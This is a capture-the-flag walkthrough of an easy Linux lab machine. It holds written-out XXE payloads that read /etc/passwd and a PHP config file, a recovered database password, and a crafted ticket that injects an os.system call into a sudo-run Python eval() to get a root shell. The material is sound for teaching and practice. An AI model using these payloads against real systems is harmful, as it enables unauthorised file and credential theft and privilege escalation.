## **BOUNTY HOUNTER  WRITE  UP**

Machine Difficulty: <span style="color:#39e600">Easy</span> | Machine OS: <span style="color:#39e600">Linux</span>

![image-20210730010535743](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/a24c032885e56a17a6c74cc58b63e8f4.png?raw=true)

Bounty hunter is an easy box based on well known vulnerability with a twist. For the initial foothold if you find the path you have to follow it and when it comes to end think a little bit different (OWASP will help you a lot). The root is straightforward, maybe you stuck for a bit, but if you combine some things you will get what you want!

----



**Nmap Scan**

![image-20210730010535743](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/image-20210730010535743.png?raw=true)

**Gobuster Scan**

![image-20210808143902953](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/image-20210808143902953.png?raw=true)

Accessing the /portal.php we see a bounty report form.

![image-20210808143133909](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/image-20210808143133909.png?raw=true)

Let's take the request in burp and analyze it a little bit.

![image-20210808143249434](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/image-20210808143249434.png?raw=true)

```
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPnRlc3Q8L2N3ZT4KCQk8Y3Zzcz50ZXN0PC9jdnNzPgoJCTxyZXdhcmQ%2BdGVzdDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
```

Base64 decode. We see it id xml and that is a good sign!

 ```
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 		<bugreport>
 		<title>test</title>
 		<cwe>test</cwe>
 		<cvss>test</cvss>
 		<reward6É•Ý…É�'Vw&W'C`
 ```

It brakes a little bit. We have to URL decode first and then base64 decode.

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

**XXE payload**

Create a new **ENTITY** called xxe, **SYSTEM** is a keyword that let the XML parser know that the ENTITY type is **EXTERNAL**

More about XXE on  [PortSwigger](https://portswigger.net/web-security/xxe/ ) 

````
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>Test</cwe>
		<cvss>123</cvss>
		<reward>1</reward>
		</bugreport>

````

Final PoC with URL and base64 encoded

```
data= PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4meHhlOzwvdGl0bGU%2BCgkJPGN3ZT5UZXN0PC9jd2U%2BCgkJPGN2c3M%2BMTIzPC9jdnNzPgoJCTxyZXdhcmQ%2BMTwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
```

*Response:*

![image-20210727231428484](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210727231428484.png)

We successfully read the **/etc/passwd** file!

I tried to find the id_rsa of the user **developemt**, to access the **/etc/shadow**, to access the the **db.php** but all was a dead end.

Until I used filter base64 to access the **db.php**

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
```

![image-20210730010636672](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730010636672.png)

We got a base64 string response

```
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

*Decoded*. 

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

We successfully login with ssh as **development**.

![image-20210730010919988](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/image-20210730010919988.png?raw=true)

****



## **Privilege Escalation**

My fav command **sudo -l**

![image-20210730012727472](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/image-20210730012727472.png?raw=true)

Let's locate ticketValidator.py and examine it.

```
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```

There is also and a folder with invalid tickets, this will help us!

![image-20210730013101639](https://github.com/vaggos542/vaggos542.github.io/blob/master/images/BountyHounter/image-2021073001053003.png?raw=true)

Invalid ticket (/opt/skytrain_inc/invalid_tickets)

```
# Skytrain Inc
## Ticket to Bridgeport
__ticket code:__
**18+71+8**
##Issued: 2021/06/21
#End Ticket

```

After some time modifying my **test.md** this is the final PoC for root.

```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**18+71 + __import__('os').system('/bin/bash')
```

```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

![image-20210730171259804](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730171259804.png)

ROOT ROOT ROOT!

<span style="font-family:Papyrus; font-size:2em;">Happy Hacking!</span> 



